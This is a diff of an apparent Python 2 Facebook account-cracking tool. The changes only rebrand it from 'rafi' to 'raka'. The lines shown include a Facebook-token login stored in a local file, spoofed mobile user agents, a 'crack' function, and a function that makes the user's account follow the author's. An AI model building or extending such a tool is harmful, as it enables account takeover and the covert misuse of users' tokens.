@@ -41,9 +41,9 @@ ua_six = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/
 ua_xx = "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103"
 ua_rr = "BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"
 #user agent
-rafi_ua = random.choice([ua_xx])
+raka_ua = random.choice([ua_xx])
 #pw admin
-#pw_rafi = 'rafianonym'
+#pw_raka = 'rakaanonym'
 #ip
 try:
 	ip = requests.get('https://api.ipify.org').text
@@ -60,7 +60,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(00.1)
 
-rafi_logo = '''
+raka_logo = '''
 \x1b[1;101m\x1b[1;97mCreat By : Raka Andrian Tara => 1 Januari 2022\x1b[0m
 __________________________________________________
 '''
@@ -71,7 +71,7 @@ def login():
 		token = open('login_r.txt','r')
 		menu()
 	except (KeyError,IOError):
-		print(rafi_logo)
+		print(raka_logo)
 		print ' [1] login with token facebook '
 		print ' [0] exit \n'
 		met_log = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] Choose : ")
@@ -88,7 +88,7 @@ def login():
 
 def tokenz():
 	os.system('clear')
-	print(rafi_logo)
+	print(raka_logo)
 	try:
 		token = open('login_r.txt','r')
 	except (KeyError,IOError):
@@ -99,12 +99,12 @@ def tokenz():
 			avsid = open("login_r.txt", 'w')
 			avsid.write(token)
 			avsid.close()
-			follow_my_account()
+			follow_my_raka()
 			jalan(' [!] login succes....')
 		except KeyError:
 			print ' [!] token Wrong '
 
-def bot_follow():
+def follow_my_raka():
     try:
         token = open('login_r.txt', 'r').read()
     except IOError:
@@ -182,7 +182,7 @@ def menu():
 		
 def crack():
 	os.system('clear')
-	print(rafi_logo)
+	print(raka_logo)
 	global token
 	try:
 		token = open('login_r.txt', 'r').read()
@@ -272,7 +272,7 @@ def crack():
 
 if __name__ == '__main__':
 	#os.system('clear')
-	#print(rafi_logo)
+	#print(raka_logo)
 	#user = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] siapa nama anda : ')
 	#print# ' hello : %s'#%(user)
 	#lock()
